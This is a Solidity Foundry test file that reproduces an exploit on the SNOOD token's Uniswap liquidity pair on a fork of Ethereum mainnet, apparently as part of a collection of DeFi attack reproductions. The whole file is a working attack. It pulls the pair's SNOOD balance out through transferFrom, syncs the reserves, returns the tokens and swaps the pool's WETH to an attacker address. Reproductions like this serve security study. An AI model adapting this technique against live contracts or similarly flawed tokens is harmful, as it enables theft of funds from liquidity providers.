// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IUNIPAIR is IERC20 {
    function sync() external;

    function getReserves() external returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract ContractTest is Test {
    IERC20 SNOOD = IERC20(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    IUNIPAIR uniLP = IUNIPAIR(0x0F6b0960d2569f505126341085ED7f0342b67DAe);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 14_983_660); //fork mainnet at block 14983660
    }

    function testExploit() public {
        // address attacker = vm.addr(1);
        address attacker = 0x180ea08644b123D8A3f0ECcf2a3b45A582075538;
        emit log("before the attack");
        emit log_uint(WETH.balanceOf(attacker));
        assertTrue(WETH.balanceOf(attacker) == 0);

        uint256 balance = SNOOD.balanceOf(address(uniLP));
        require(SNOOD.transferFrom(address(uniLP), address(this), balance - 1));
        uniLP.sync();

        require(SNOOD.transfer(address(uniLP), balance - 1));

        (uint112 a, uint112 b,) = uniLP.getReserves();

        uint256 amount0Out;
        if (b * 10_000 + (balance - 1) * 9970 == 0) {
            amount0Out = 0;
        } else {
            amount0Out = ((balance - 1) * 9970 * a) / (b * 10_000 + (balance - 1) * 9970);
        }

        uniLP.swap(amount0Out, 0, attacker, "");

        emit log("WETH after the attack");
        emit log_uint(WETH.balanceOf(attacker));

        assertTrue(WETH.balanceOf(attacker) > 0);
    }
}
